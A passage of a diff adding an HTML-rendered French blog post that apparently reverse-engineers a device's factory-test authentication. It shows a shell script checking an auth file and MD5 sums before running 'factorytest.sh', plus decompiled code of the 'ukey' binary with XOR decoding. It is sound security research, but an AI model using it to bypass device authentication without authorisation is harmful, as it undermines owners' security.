+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">check_auth&lt;span class="o">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="si">${&lt;/span>&lt;span class="nv">THISDIR&lt;/span>&lt;span class="si">}&lt;/span>/../bin/ukey -t &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &amp;gt; /dev/null 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;/opt/images/public_key.der&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;has public key file, exit with 1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">exit&lt;/span> &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">AUTH_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> exit_with_msg &lt;span class="m">1&lt;/span> &lt;span class="s2">&amp;#34;no auth file&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> exit_with_msg &lt;span class="m">1&lt;/span> &lt;span class="s2">&amp;#34;no scrip file&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">check_auth &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">AUTH_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> exit_with_msg &lt;span class="m">2&lt;/span> &lt;span class="s2">&amp;#34;auth file has been changed!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">source&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">AUTH_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">MD5SUM_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> exit_with_msg &lt;span class="m">3&lt;/span> &lt;span class="s2">&amp;#34;no md5sum file&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># get script md5sum&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SCRIPT_MD5SUM&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>md5sum &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> cut -d&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span> -f1&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;SCRIPT_MD5SUM=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_MD5SUM&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># check md5sum of script and other files&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">AUTH_DIR&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>dirname &lt;span class="si">${&lt;/span>&lt;span class="nv">AUTH_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">AUTH_DIR&lt;/span>&lt;span class="si">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">MD5SUM_MD5SUM&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>md5sum &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">MD5SUM_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> cut -d&lt;span class="s1">&amp;#39; &amp;#39;&lt;/span> -f1&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">MD5SUM_MD5&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">MD5SUM_MD5SUM&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> exit_with_msg &lt;span class="m">4&lt;/span> &lt;span class="s2">&amp;#34;md5sum file has been changed!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SCRIPT_MD5_COUNT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>grep &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_MD5SUM&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">MD5SUM_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> wc -l&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_MD5_COUNT&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;1&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">||&lt;/span> exit_with_msg &lt;span class="m">5&lt;/span> &lt;span class="s2">&amp;#34;script has been changed!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">md5sum -c &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">MD5SUM_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> exit_with_msg &lt;span class="m">6&lt;/span> &lt;span class="s2">&amp;#34;check md5sum failed!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> -
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;check auth ok, start run &lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_FILE&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sh &lt;span class="si">${&lt;/span>&lt;span class="nv">SCRIPT_FILE&lt;/span>&lt;span class="si">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Résumons les parties plus intéressantes du script :&lt;/p>
+&lt;ul>
+&lt;li>Execution de la fonction &lt;strong>check_auth()&lt;/strong>, qui elle exécute le binaire &lt;strong>/bin/ukey&lt;/strong> en lui passant le fichier &lt;strong>./auth.ini&lt;/strong> avec le paramètre &lt;em>-t&lt;/em> afin de vérifier qu&amp;rsquo;un certain fichier n&amp;rsquo;a pas été modifié&lt;/li>
+&lt;li>Vérification que le MD5 réel du fichier spécifié dans la variable &lt;strong>MD5SUM_FILE&lt;/strong> &lt;em>(fichier auth.ini)&lt;/em> est bien égale au hash spécifié dans la varible &lt;strong>MD5SUM_MD5&lt;/strong> &lt;em>(fichier auth.ini)&lt;/em>&lt;/li>
+&lt;li>Vérification que le MD5 réel du fichier &lt;strong>factorytest.sh&lt;/strong> est bien égale au hash spécifié dans le fichier &lt;strong>MD5SUM_FILE&lt;/strong>&lt;/li>
+&lt;li>Si toutes les conditions sont satisfaites, alors le script &lt;strong>factorytest.sh&lt;/strong> est exécute&lt;/li>
+&lt;/ul>
+&lt;p>Les conditions concernant les calculs MD5 étant plutôt clair, concentrons nous sur la première condition liée à la fonction &lt;strong>check_auth()&lt;/strong>. Faire une analyse statique sur le binaire &lt;strong>/bin/ukey&lt;/strong> serait un bon début :&lt;/p>
+&lt;div class="gblog-expand">
+&lt;label class="gblog-expand__head flex justify-between" for="b483c359-6">
+&lt;span>FUN_000089f8 - FONCTION PRINCIPALE&lt;/span>
+&lt;span>↕&lt;/span>
+&lt;/label>
+&lt;input id="b483c359-6" type="checkbox" class="gblog-expand__control hidden" />
+&lt;div class="gblog-markdown--nested gblog-expand__content">
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">undefined4&lt;/span> &lt;span class="nf">FUN_000089f8&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uint&lt;/span> &lt;span class="n">uVar1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">_pcVar2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">iVar3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">FILE&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">byte&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uint&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">puVar5&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uint&lt;/span> &lt;span class="n">uVar6&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uint&lt;/span> &lt;span class="n">uVar7&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uint&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">puVar8&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">local_9c&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">local_94&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">local_90&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">local_8c&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">104&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">do&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">getopt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;r:w:t:e:d:u:a:n:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pcVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">optarg&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">switch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">case&lt;/span> &lt;span class="mh">0x61&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">stream&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optarg&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;r+&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">byte&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">operator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">[](&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">_stream&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FILE&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Can not open file %s.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pcVar2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x100&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">stream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uVar6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uVar4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_9c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">***&lt;/span>&lt;span class="n">ptr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x79&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uVar4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_9c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xff&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x79&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uVar4&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_9c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xfd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="n">_ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x79&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">local_9c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0xfe&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uVar6&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x100&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">uVar4&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puVar5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uVar7&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puVar8&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">uint&lt;/span> &lt;span class="err">\&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="o">**&lt;/span>&lt;span class="n">ptr&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">do&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puVar5&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">puVar5&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">uVar7&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">uVar7&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>&lt;span class="n">puVar8&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">puVar5&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="mh">0x86868686&lt;/span>&lt;span class="p">;&lt;/span>
